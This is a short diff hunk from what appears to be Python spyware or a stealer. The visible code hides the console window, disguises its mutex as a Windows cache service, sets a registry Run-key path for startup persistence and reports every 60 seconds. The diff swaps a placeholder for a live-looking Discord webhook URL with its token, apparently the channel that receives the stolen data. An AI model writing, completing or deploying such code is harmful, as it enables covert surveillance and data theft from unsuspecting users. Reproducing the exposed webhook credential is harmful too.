@@ -15,7 +15,7 @@ try:
         ctypes.windll.user32.ShowWindow(console_hwnd, 0)
 except Exception:
     pass
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 INTERVAL = 60
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
